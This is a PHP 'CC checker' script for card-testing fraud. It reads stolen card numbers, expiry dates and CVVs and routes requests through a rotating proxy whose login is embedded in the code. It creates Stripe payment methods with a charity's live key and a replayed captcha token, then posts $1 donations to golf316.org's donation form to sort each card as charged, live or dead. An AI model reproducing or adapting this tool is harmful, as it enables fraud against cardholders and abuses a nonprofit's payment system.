<?php 
////////////////////////////===RAW BY HARIS===////////////////////////////
require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

/* Existing proxy.txt functionality disabled
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();
*/

$auth = "ptaatnpk-rotate:154y8hu5wbc6";
$ip = "p.webshare.io:80";
$proxy = $ip;
$proxyauth = $auth;
$url = 'http://api.ipify.org/';

// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

// Execute the cURL request and get the response
$response = curl_exec($ch);

// Check for cURL errors
if(curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
} else {
    // Print the IP address
    echo 'IP Address: ' . $response;
}

// Close the cURL session
curl_close($ch);

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end) {
    $start = @strpos($str,$find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));

}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[1 Req]

sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=0ac7adf5-1dde-45a6-a3fc-c4bcf2636da3bf6b31&muid=2a81ad3e-24a8-443c-9207-23213578e39478ca51&sid=93b45208-4c90-44b2-a01a-36c31bb72649eda2af&payment_user_agent=stripe.js%2F43ed98c41d%3B+stripe-js-v3%2F43ed98c41d%3B+card-element&referrer=https%3A%2F%2Fgolf316.org&time_on_page=27097&key=pk_live_51NJgOXCjU8lO8MWc81K66yGhcm9C0UPHTGgfypyAMPmRU79JIeCDD5mPWBGOU2v8hcYshCsaVmnqNzl50NQEe4p100CxLWdRv1&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiT2h1MjFPTWkvVDNoNWd6c2NWczlJeDd3MW43Y0RTUGhNMzdjaXg1aTdldHdrK1hPOWF1MDRpS3VhRUZMRWgvNDgyQ3VxRnhDZTlmaTEzR2h5RmhSSk4yMnF6ZEFmUmQrVGcrTjNLK255b0NGNE94OE5UVjRtZloxNGt5OWZHM0syYXpIUXVnb1g0akN0OTJ2Z1ZPRGI3OUUvaGlTdUozS2huVEJOUkZwbjNCL04xSWxpL1BGNDRpdHRzc25KRTdoYUF3V1R2RmxTNHRNMDUvOHJpN2toN0toKzRZTTVWL2Nsanc2ckNIK21FOWN3NWNPN2xsRERCZm9yWlA5eDE5c2xMMlY5L1M4NmgxNVdLUUIrRUR5OGlHQ3dRbzRDYy90TXhNV1VQNnppSllRQjZQTkNsamNIendpUkRzVEVXNGlwV0RZMEsyL081SzJPejRQbEN5aWdtN3BlLzkzS0hRc2RMaTFHd29OS0pWMEZXeDJCRlQrL0tJenhBdWtzN1U0c1RETURtVWFLNWRuaUxtTlhUTlFBejk3cmx2TEl3L29pcmNSTVlrQXB5dlBUOEJlTW0yejFMYmNoL0ZxcVhYdTk3U0RROUc0VVZMQWxheElxWHJDUXRLUitxbUtaTlZ3OEdDWkxuaXJRVDNKVDF4ZC9UamlITklCV3hqTDF5NDQ5cDVodlhHcnd0aDAwdWlGYkoxek9IR1pwdENIdnJlRnVVZmgwUU9VTkYrMVlESmZEclpGYnRGeGxILzVieEVGWEhETUE1UHZGemZCOU1UTmZpd0V6L09zSWhoYzJjdk8vbXpJNnUrVXpOWEM0RVBqTndNRXZ4RWd3NW94M29Oenl3ZUpVcW9EVVd6elQvcWVjVVpqeTR6ei9JNDNuSWRySDJIZXd2YnVlb0IrRWFjUG5IcUIwbXpVQmZrNjNnamtqNlBOMUFsSDdheXhNZVNZQllFUnlRYmNvem9iZ0FjcGJpRWw1RlVUWXl3UkNBMHBZWFpWWnNZQ3pna2d6MmEyMDJISVk5M2FpMTdRMTBXSUFBMm51czFrRENGQUdOWCtOVjlXN3pZVVIxVmJ2UXVDK2l5WFdySWdkMEdoeDBLb2p0TkN4NlZIdTdpK0hmVkM5b0hWTTEzWnpFZmY2c3lrcnd1VDdhdE5LY1BhQnJ6aUhQaThWcjBldm5kMExyS1V4UitRQ2F2Q3pKTzEzYXZTcGE3VEVrRGkvMUxIczdZM3J6UkhjSVh6a0lUenBBZWdVWG9SeHZvOGZNQkJoUHYrQWtzeFdKTVg1bzU5TFhONzd1MjI3UWgxVElTZlVYVm9UU3dyS3EzOW1FVzF5WlEvREdYVjVoRy9tZXlsMkc3RWt5QjNCc2J6eWRhZTRMME5PbTdOQjhuMmcwR2ZheGtuNTFza28yTi8vbVk0d3kvdTliOEMvNnowTGd5YWNCd1Nacm5vMWI1ZU1lSGxDanhjMUhvZGRWelZEQmRVN1dhMVBTc3ljQ3htNHlyTzBIQ0FEaVl6K0d2dzJkUlQyOVd5azJXMTVDK256a1ovSjhQNG81ZHZvQzhNTVp4T25RckpXandNU0JCRUhVbEtUdkg4WUtMRHZlbTZNVTU1bjRMcExUVkRBelpVVWcvYjdNR2l4K1VXUWRqMm81K0N4WFpuKzRTYzk3SE5uMmpnZmgrVjZtTUJ5MWNDQ3hXaTN4Rmd4NytXQlV5ZU1BcUc1M2tKRGlpa3c4dEo0UE1HWElMOXlaZk12dmtkdzkyWkJPcGEzRFRUakJNZXF5NGFiZ3UxWFZFeXBFSDZNdlRLbWdDRWVXdUc1NU54aU1LNlFrRit6dTg4a0wrWk9Mdlp6UnFzNDlERXFLNWFDTWl3Q0o0VDEyQ2JBUENnS0lSRkVjR3psOHF4d1EvaFZadU16d3JqcGlEbTczeEJDSXhPRnk0dDBvc3R3T1Z1NWZ1aGhPdTZJNGV5akJTTjVjZUYraEFhSU5rU3dnSUdGeVc2YmoyWERXL1R3OUlOanIwcDdDZmp5V3d0S3JYaExzdFMrRFVMWWdzV01OYlU0eXJFbTdjV2pLY21rMlVhY25MV3RFZlRlV1g2RjBRUTJsdGhjeDk5WUlKK1A1NThtOEd1eWZSMmE0RThmd3JBZjYzbmNzOVhXZkVscnRxV1NkZ1Jpd1IrcUlxZVBEd2xrVHRDV2RpK3lXbzBxU09sbjVkS3plWXU2M1N0YU1BRGJvaDBSMG9VU0dIR0NtY0pMZ0Jpb1hoaXVtVU1HM0ZaYVQ5V2h5OXdlM2ppaDJSNmlLMEdmVGRscHJkeXBiTnVRUlF3TkVIdnRITTJiTys1ZkJKOTBmcndLcTVDMHBoWmp3RWNoRFRBeDJKMzR2dmdmOE96S3BiS0NVM0F4TlBuYjUycTZwaU9weElZNGJuTDJRdHpueXFwalBESUFPSC8xT2FBKzEvSi8zTEYyVGFKM1pnZ2F6ZXlscDdEdEtNOEl1Ly9lUWI1RTd3ZjIxZ1NjL216cjdzeUFaY2FHaTJjY0JFNlBWcmdzck9ROFZjcjNjSXErczlsNVp6S2xLVjcvcVI5N2NYd2lES2krVnUvVzBJWjRXUS9DTUkvWjRVZVRFOUZMemJRT1hyTFUySjhRVFJuQ3lyOUJTOEx1Z2w5eVE3K2VTUHRsNDVkTnhaenZ6RlhBYjlZbFU2OTRGSm5rZEtOdHMwZks4RnhjbXhQWVVOaFZTMFdiOXdYTnBTWkNRc1BJN0xZZnVUS3JWTEdVRnFwcjkvb3k4MU5ZQi9wWXBVbGR2Vi9Uc0NTVXU2aTByeTYwNG5nWW9PVDVEa2NtQXRRODU4PSIsImV4cCI6MTcyNzk0OTA0NSwic2hhcmRfaWQiOjM2MjQwNjk5Niwia3IiOiIyOTVkMDgyNCIsInBkIjowLCJjZGF0YSI6InU2MVFVYTErUWlWMGNBUHdERklxUXYzNU52ejdZeUdDcThGMGY0TUNGcnk0TTZJbll3LzFZVS8xUG4zY1dIc2pscDFLR3g3V3p4WDBzalhGNTZBQStqRGJxRThsMmtrbjhnbCszbmhUOTZnR1g4ZkIyV2dpZmYySyt3dWx3c1RCRWhUYW5MeDVmOVpCV0ZzZVpBSHpoMGltMDhQRGRNdlN6Um5pYVRXdFBtaEYvNG8zRFlnR2lock42cE1OREl4T2tJYUpBMU5MZm1Ja0FzMUEifQ.zL3_XzQ5IeyuPZJvxLiU5bx_SmHkV0OkveiLyu4ghKw');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$country1 = trim(strip_tags(getStr($result1,'"country": "','"')));
$funding1 = trim(strip_tags(getStr($result1,'"funding": "','"')));

////////////////////////////===[2 Req]

sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://golf316.org/wp-admin/admin-ajax.php?t=1727948948131');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1727948948131 h2',
'Host: golf316.org',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'x-requested-with: XMLHttpRequest
sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://golf316.org',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://golf316.org/donations/',
'accept-language: en-US,en;q=0.9',
'cookie: __stripe_mid=2a81ad3e-24a8-443c-9207-23213578e39478ca51',
'cookie: __stripe_sid=93b45208-4c90-44b2-a01a-36c31bb72649eda2af',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D2161%26_fluentform_7_fluentformnonce%3Db7207638cd%26_wp_http_referer%3D%252Fdonations%252F%26names%255Bfirst_name%255D%3D%26names%255Blast_name%255D%3D%26email%3D%26payment_input%3DOther%26custom-payment-amount%3D1%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=7');

$result2 = curl_exec($ch);

////////////////////////////===[Responses CVV]===////////////////////////////

sleep(10);
if
(strpos($result2,  'success')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#CHARGED CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: Payment successful ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'security code is incorrect')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#LIVE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#LIVE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'insufficient funds')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#LIVE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: INSUFFICENT FUNDS ✅ </i></font><br> <font class='badge badge-dark'> $bank $country Power Bysanji ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>#LIVE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV LIVE ✅ </i></font><br> <font class='badge badge-dark'> $bank $country Power Bysanji ⚡ </i></font><br>";
}

else {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>#DIE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Result: Your card was declined ❌ </i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
echo $result2;
////////////////////////////===RAW BY HARIS===////////////////////////////
?>
